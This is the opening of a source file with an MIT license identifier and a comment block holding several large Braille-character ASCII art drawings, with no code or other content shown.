// SPDX-License-Identifier: MIT
/*
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⠽⠭⣥⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡴⠞⠉⠁⠀⠀⠀⠀⠉⠉⠛⠶⣤⣀⠀⠀⢀⣤⠴⠞⠛⠉⠉⠉⠛⠶⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⣏⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠏⠀⠀⠀⠀⠀⠀⢀⣠⠤⠤⠤⠤⢤⣄⡀⠀⠀⠹⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⠐⠈⠁⠀⠀⠀⠀⠀⠀⠀⠉⠛⠶⢤⣽⡦⠐⠒⠒⠂⠀⠀⠀⠀⠐⠒⠀⢿⣦⣀⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⡞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⡤⠤⠤⠤⠤⠠⠌⢻⣆⡀⠀⠀⠀⣀⣀⣀⡀⠤⠤⠄⠠⢉⣙⡿⣆⡀⠀
⠀⠀⠀⠀⣀⣴⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⢶⣛⣩⣶⣶⡾⢯⠿⠷⣖⣦⣤⣍⣿⣴⠖⣋⠭⣷⣶⣶⡶⠒⠒⣶⣒⣠⣀⣙⣿⣆
⠀⠀⢀⠞⠋⠀⡇⠀⠀⠀⠀⠀⠀⢀⣠⡶⣻⡯⣲⡿⠟⢋⣵⣛⣾⣿⣷⡄⠀⠈⠉⠙⠛⢻⣯⠤⠚⠋⢉⣴⣻⣿⣿⣷⣼⠁⠉⠛⠺⣿
⠀⣠⠎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣟⣫⣿⠟⠉⠀⠀⣾⣿⣻⣿⣤⣿⣿⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⣿⣿⣻⣿⣼⣿⣿⠇⠀⠀⠀⢙
⢠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⡶⣄⠀⠀⢻⣿⣿⣿⣿⣿⡏⠀⠀⠀⣀⣤⣾⣁⠀⠀⠀⠸⢿⣿⣿⣿⡿⠋⠀⣀⣠⣶⣿
⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠺⢿⣶⣶⣮⣭⣭⣭⣭⡴⢶⣶⣾⠿⠟⠋⠉⠉⠙⠒⠒⠊⠉⠈⠉⠚⠉⠉⢉⣷⡾⠯
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠀⠀⠀⢈⣽⠟⠁⠀⠀⠀⠀⣄⡀⠀⠀⠀⠀⠀⠀⢀⣴⡾⠟⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡴⠞⠋⠁⠀⠀⠀⠀⠀⠀⠈⠙⢷⡀⠉⠉⠉⠀⠙⢿⣵⡄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣧⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⠟⠋⠉⠀⠀⠉⠛⠛⠛⠛⠷⠶⠶⠶⠶⠤⢤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⡤⢿⣆⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡶⠋⠀⠀⠀⠸⠿⠛⠛⠛⠓⠒⠲⠶⢤⣤⣄⣀⠀⠀⠀⠈⠙⠛⠛⠛⠛⠒⠶⠶⠶⣶⠖⠛⠛⠁⢠⣸⡟⠀
⠀⠀⠀⠀⠀⠀⢰⣆⠀⢸⣧⣤⣤⣤⣤⣤⣤⣤⣤⣤⣀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠓⠒⠲⠦⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣾⠋⠀⠀
⡀⠀⠀⠀⠀⠀⠀⠙⢷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠛⠲⠶⣶⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡾⠃⠀⠀⠀
⣿⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠛⠛⣳⣶⡶⠟⠉⠀⠀⠀⠀⠀
⠛⢷⣿⣷⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⠙⠻⢷⣬⣗⣒⣂⡀⠠⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣤⡴⠾⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⠶⠶⠶⠶⣤⣤⣭⣭⣍⣉⣉⣀⣀⣀⣀⣼⣯⡽⠷⠿⠛⠙⠿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠈⠻⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⠔⠚⠋⠉⠉⠉⠉⠉⠛⠓⠦⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠞⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢠⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠈⢧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⡟⠀⠀⠀⠀⠀⠀⣠⣴⠿⣛⣛⠿⣾⢿⣛⡛⠻⢷⣦⡀⠀⠀⠀⠀⠈⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡾⠀⠀⠀⠀⠀⣠⡾⣫⠔⠚⢉⣀⣤⣿⣄⣈⡉⠓⢦⣌⠻⣦⡀⠀⠀⠀⠘⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⣼⢯⢟⣡⠴⠚⢉⣀⡼⠻⣦⣀⠉⠑⠲⣌⡑⢌⢻⡄⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⡇⠀⠀⠀⣸⣷⣣⢚⣠⣴⣾⠿⠛⠁⠀⠈⠻⢿⣷⣦⣤⣉⠢⣻⣿⡄⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠸⡇⠀⠀⢰⣯⣿⠟⣫⠞⣿⠀⠀⠀⠀⠀⠀⠀⠀⠉⢹⠳⡍⠳⢯⣽⣷⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢻⡄⠀⢸⡿⢁⡼⣁⣼⣏⣀⣀⣀⡀⠀⠀⣀⣀⣀⣸⣦⠈⠣⡈⠻⣿⠀⢸⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⢷⣠⡟⣰⣯⢞⣿⣿⣫⣿⣿⣿⣷⡀⣰⣿⣿⣷⣾⣿⣷⣤⡘⢦⣹⣷⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⣿⢸⡿⢁⡞⢠⡇⠉⠻⠿⠛⢿⡇⢹⠈⠙⠛⠋⠀⢹⡿⣝⠻⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢻⡏⢠⠎⢠⣿⡇⠀⠀⠀⠀⣤⡇⢈⣄⠀⠀⠀⠀⢻⣧⡈⢢⡘⢿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢠⣿⢱⠋⡴⠋⣸⣧⣤⠀⠀⣠⠿⢷⡾⢾⣀⠀⠀⣴⡾⢿⠙⢦⣍⢧⣻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢸⣿⣣⠞⠀⣰⢻⡏⡏⣧⣼⡥⢿⣿⣿⡦⣌⣷⣰⠁⡇⣼⣷⡄⠈⠳⣝⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⣿⠋⢀⡼⢡⡿⣷⣧⢻⢻⣷⣺⣯⣏⢧⣨⢿⢹⣤⣿⣿⠹⣟⠷⣄⠈⠻⣧⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣼⠏⢠⠎⢠⡞⢠⢿⣿⣾⣼⡇⡟⢻⠘⡾⢻⢸⣿⡟⣿⡏⣦⠈⠳⡈⠳⣄⠘⢿⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠐⣿⣠⠏⢀⡎⠀⣼⠘⣿⡌⠻⢧⣧⣸⠀⣇⣼⣾⠏⠀⣿⣧⠈⣆⠀⠘⢢⡈⠳⣜⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣀⣤⣾⣿⠀⢸⠀⠀⣿⠀⢹⣿⣄⠀⠉⠻⠶⠟⠋⠁⠀⠀⣿⣿⠀⠘⣇⠀⠀⢿⡀⣸⢿⣦⣀⠀⠀⠀⠀
⠀⢀⣠⣶⣿⠛⠁⠀⢹⡷⠾⢤⣄⣹⣄⠀⠙⠿⢷⣤⣀⠀⠀⠀⠀⢠⣴⠟⠁⠀⢀⣸⣀⣴⠟⡿⠉⠀⠈⠻⣷⣄⠀⠀
⣶⡿⠋⠁⢻⡄⠀⠀⠸⡇⠀⠀⢨⣿⠋⠛⠒⠒⠒⠛⠷⣤⣤⣤⣤⡤⠞⠛⠓⠛⢻⡏⠉⠁⢠⡇⠀⠀⢀⣶⠋⠙⣿⣄
⠻⣧⡀⠀⠈⣿⠀⠀⠀⣇⠀⠀⢸⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⣾⠀⠀⢀⡾⠁⠀⢀⣾⠟
⠀⠹⣷⡀⠀⠘⣧⠀⠀⢻⡀⠀⣾⠈⠙⢷⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⢻⡇⠀⢀⡿⠀⠀⡾⠃⠀⣰⣿⠋⠀
⠀⠀⠘⢿⣖⠀⠹⣇⠀⢸⡇⠀⣿⠀⠀⠀⠀⠉⠙⣛⣶⣶⠶⠶⠶⠚⠛⠉⠁⠀⢸⡇⠀⢸⠃⠀⣼⠃⠀⣰⡿⠁⠀⠀
⠀⠀⠀⠈⢻⣦⡀⠹⣆⠀⢻⠀⢻⡀⠀⠀⠀⠀⣾⢿⣛⢛⠷⡄⠀⠀⠀⠀⠀⠀⢸⡇⠀⡾⠀⣸⠇⠀⣸⡿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠹⣷⡄⡿⡆⠸⣆⢸⡇⠀⠀⠀⠈⠿⡾⣿⡼⣦⡝⠀⠀⠀⠀⠀⠀⢸⠃⢸⡇⢠⡏⠀⣼⡟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⢿⣮⣻⣆⣿⣸⣷⠀⠀⠀⠀⣀⣿⠿⠿⠿⣗⣀⡀⠀⠀⠀⠀⣼⠀⡾⢀⡟⢀⣾⠟⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣽⣽⣿⣿⠀⠀⠀⣾⣿⡥⣴⣤⢴⣾⡽⡇⠀⠀⠀⠀⡿⢰⢇⡞⣠⡾⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⠀⠀⠀⠉⠻⣄⠀⠉⠉⣠⠟⠁⠀⠀⠀⠀⣇⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣤⣀⣀⣀⣀⣈⣳⣤⣞⣁⣀⣀⣤⣤⣤⣴⣿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⠦⣤⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣄⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣤⣀⣴⣾⣿⡿⣋⣴⣿⣿⣿⣿⣿⣿⣦⣤⣽⣿⣷⣦⣀⣹⣿⣿⣷⣴⣿⣿⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣹⣿⣿⡏⢹⣟⣼⠏⠛⢻⣿⣿⣿⡿⠏⣉⣭⣿⣿⣿⣯⠉⣿⣿⣿⣿⣿⡹⣿⣿⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⠟⢡⣤⡄⠋⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠹⣿⣿⣿⣿⣷⣄⠙⢿⣿⣿⣿⣧⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⠏⣿⢰⣿⣿⠇⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⣿⣿⡙⢿⣷⣆⠉⢻⣿⣿⣿⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⢰⣿⠀⢻⣏⠀⢻⣿⣿⣿⣿⡿⠛⢿⣿⠟⠛⠙⣻⣿⣿⣿⣿⣿⣿⣿⣿⣧⣄⣽⣿⣧⢀⣿⣿⣿⣿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⠀⣿⡇⢰⣿⠀⠀⠻⠿⣿⣷⣶⣶⣾⣋⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠈⣿⣿⣿⣿⣿⣿⣟⣠⣶⡾⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣤⣤⣤⣤⣤⣴⣿⡿⠛⣿⣿⣿⡇⢻⣿⡈⠛⠀⠀⣠⣤⣄⡙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⢠⡛⢿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀
⠀⠐⢶⣄⣀⣰⣾⡿⠿⠿⠿⠿⠿⠛⠀⣠⣿⣿⣿⠷⣮⡉⠉⠀⢰⣿⣿⣿⣿⣿⣦⠤⠀⢸⣿⡿⠋⠹⠿⠿⠿⢿⣿⣿⣿⣿⣿⣷⣿⣧⡀⢻⣿⣿⣿⣿⣧⣴⣶⠂⠀
⠀⠀⠀⠈⠉⠙⠉⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⡇⠀⣿⣿⣆⠀⣶⡉⠛⠛⠿⣿⣿⠀⠀⣿⣿⣥⣤⣴⣷⡶⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣧⣼⣿⣿⣿⣿⡞⢿⠃⠀⠀
⢀⣠⠶⠒⠚⠛⠾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠇⣸⣿⣿⣏⠀⠈⠿⣷⡦⣤⣈⣉⣀⡀⠉⠿⣿⣿⣿⣯⣛⣿⢿⣿⣿⣿⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢸⣷⣶⠀
⠈⠀⠀⣀⣀⣠⣤⣬⡿⠟⠿⣿⣿⣿⣿⡿⠛⢁⣴⣿⣿⣿⣿⠀⠀⠀⠻⣷⣄⠀⠙⣛⠿⣷⣦⡘⠿⠿⢿⣯⣥⣄⣿⣿⣿⣿⣿⡀⠻⣿⣿⣿⣿⡿⣋⠁⠀⢸⣿⠃⠀
⠀⠀⠈⠙⠻⣿⣏⣁⠀⠀⠀⠀⠈⢉⣀⠤⠾⠻⣿⣿⣿⠿⢋⣠⣤⣤⠄⠈⠛⢷⣦⣌⠳⣮⣉⠛⠂⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⡿⠇⣻⡷⠀⣙⣻⡀⠀
⠀⠀⠀⢀⡴⠿⣿⣿⣿⣿⣷⣶⣿⣿⣁⠀⠀⠀⠹⠟⠦⣶⢛⣩⣽⢷⣤⣤⣤⣄⠙⠿⠧⠈⠿⠇⠈⣛⠛⠿⢿⣿⡿⠛⢻⣿⣿⣿⡿⠛⢉⣭⣶⡿⠛⣀⡰⣿⡿⠿⠇
⠀⠀⣀⣀⣀⠀⠸⣿⣿⣿⣿⠿⠿⣿⣿⣿⣷⣶⣶⣦⣤⣾⣿⠟⠁⠀⠉⠉⠙⣿⠀⠀⣰⣷⣦⠀⠀⠙⠷⣦⣄⣀⣳⣦⣼⠿⠟⠋⢀⣶⣿⣿⠋⣠⣾⠿⢈⣿⣦⠀⠀
⠀⠉⠙⠛⠻⢷⣤⡈⠙⠛⢁⣠⣴⣿⣿⣿⣿⣿⣿⣿⠿⠛⠁⢀⠀⠀⣀⡀⠀⠛⠒⠚⠁⠈⣯⣠⠖⠒⣤⠀⠈⣉⣙⡋⠀⠀⢻⡗⠈⢿⣿⠏⡘⠛⢃⣴⠿⣿⣿⠀⠀
⠀⠀⠀⠀⠀⠀⢹⣿⣶⣶⣿⣿⣿⠏⠀⣠⣾⣿⠿⠆⠀⠀⠀⠈⢉⡙⠻⠿⢿⣶⣄⠀⠀⠀⠉⠁⠀⠀⣸⣇⡴⠿⠿⠿⡆⠀⢀⣀⣀⣀⣀⣼⣿⣶⣿⣿⡆⢹⣿⠀⠀
⠀⠀⠀⠀⠀⠀⠸⢿⣿⣿⣿⡿⠋⠀⣼⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠳⣄⡀⠀⠉⠛⢷⣦⣄⠀⠀⠀⠐⠋⠀⠀⠀⠀⠀⢳⡴⠋⠉⠀⢹⣿⣿⣿⣿⣿⠋⠀⢸⣿⠇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠈⠻⠷⣦⣤⣤⠼⠻⠿⠶⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣸⣿⣿⣿⣿⣿⠀⠀⢸⣿⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⡶⠞⠛⠛⠛⠛⣻⣿⣿⣿⣿⣿⣿⠀⠀⣾⠋⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⢿⣅⣀⣀⣀⠀⢀⣾⣿⣿⣿⣿⣿⡟⠉⢀⣾⡏⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠃⠈⠉⠉⠉⠁⣠⣿⣿⣿⣿⣿⣿⣿⡇⠀⣾⣿⠇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⢀⣾⠃⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⣿⣿⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⡿⠀⠀⠀⠀⢀⣀⡀⠀⠀⠀⢿⡄⠀⠀⠀⠀⣼⡟⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢀⣿⡟⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣇⣀⣤⣾⣿⣿⣿⣿⣿⣷⣦⣼⣷⡀⠀⠀⢰⣿⣀⣤⣾⣿⣿⣿⣿⣿⣿⠟⣡⡴⠛⣿⣿⣿⣇⣿⠟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⠟⠉⠀⠀⠈⠙⠻⣿⣿⣿⣿⣦⣤⣾⣿⣿⣿⣿⠟⠉⣡⣾⡟⣱⡿⠋⣠⣾⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⡇⠀⠀⠀⠲⣤⣤⣀⣀⠈⠉⠉⣻⣿⠛⢿⣿⣿⡇⠀⢠⣿⡿⢱⣿⠁⣴⣿⠋⢀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣷⡀⠀⠀⠀⣿⣿⣿⠟⠛⠂⣴⡿⠁⠀⣸⣿⣿⡇⢀⣿⣿⠃⢸⢣⣾⣿⠇⢠⣾⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣷⣀⠀⠀⣿⣿⣿⠀⢀⣼⡟⠀⠀⠀⣿⣿⣿⡇⢸⣿⡟⠀⢰⣿⡿⠁⢠⣾⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠻⣿⣿⣿⣷⣶⣾⣿⣏⣴⡿⠋⠀⠀⠀⢸⣿⣿⣿⣿⢸⣿⠇⣰⣿⠟⠁⣰⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠛⠛⠛⠛⠋⠁⠀⠀⠀⠀⢀⡾⡳⠛⣿⣿⢸⣿⣤⠟⠃⢀⣾⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡿⠃⢀⣿⡇⢸⣿⠏⠀⣰⣿⠟⠉⣸⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡵⢡⣾⣿⣿⠃⢸⣿⠀⣼⣿⠋⢀⣼⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡏⢁⣿⣿⡿⠁⣴⣿⠟⢰⣿⡇⢠⣾⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⣼⣿⡿⢁⣾⣿⡏⢀⣾⣿⢁⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⢠⣿⡿⢡⣿⣿⡟⢸⣿⣿⡿⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
